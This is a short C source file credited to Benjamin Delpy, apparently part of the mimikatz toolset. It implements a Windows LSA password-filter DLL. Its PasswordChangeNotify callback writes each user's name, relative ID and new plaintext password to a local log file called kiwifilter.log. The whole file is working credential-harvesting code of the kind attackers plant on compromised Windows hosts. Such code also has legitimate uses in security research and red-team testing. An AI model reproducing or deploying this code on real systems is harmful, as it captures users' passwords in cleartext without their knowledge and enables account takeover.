/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kfilt.h"

BOOLEAN NTAPI kfilt_InitializeChangeNotify(void)
{
	return TRUE;
}

NTSTATUS NTAPI kfilt_PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword)
{
	FILE * kfilt_logfile;;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kfilt_logfile = _wfopen(L"kiwifilter.log", L"a"))
#pragma warning(pop)
	{
		klog(kfilt_logfile, L"[%08x] %wZ\t", RelativeId, UserName);
		klog_password(kfilt_logfile, NewPassword);
		klog(kfilt_logfile, L"\n");
		fclose(kfilt_logfile);
	}
	return STATUS_SUCCESS;
}